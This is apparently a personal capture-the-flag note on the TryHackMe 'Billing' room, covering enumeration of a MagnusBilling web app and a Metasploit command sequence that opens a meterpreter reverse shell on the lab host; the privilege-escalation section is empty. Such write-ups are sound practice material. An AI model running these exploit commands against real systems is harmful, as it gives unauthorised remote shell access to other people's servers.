
2025-03-31 20:59

Source: #tryhackme #Boot2root 

Web page at port 80 which has a login page
### Enumeration 

Dirsearch shows a lot of options 
`README.md` holds version number of the service running on the app (i.e. MagnusBilling)

Then I did a bit of digging online and found [this](https://eldstal.se/advisories/230327-magnusbilling.html). (This didn't work)
### Exploiting 

Because this exploit was on Metasploit we do it that way 
below is the list of commands used to obtain meterpreter shell from start to end 
```
msfconsole 
search MagnusBilling
use 0 
set LHOST tun0
set RHOSTS billing.thm
exploit 
```

After getting the meterpreter shell type `shell` to get access to all Unix shell commands 
### Privesc 



### References
[TryHackMe | Billing](https://tryhackme.com/room/billing)

[CTF Chronicles: Billing | THM – NATSec](https://natsecure.wordpress.com/2025/03/08/ctf-chronicles-billing-thm/)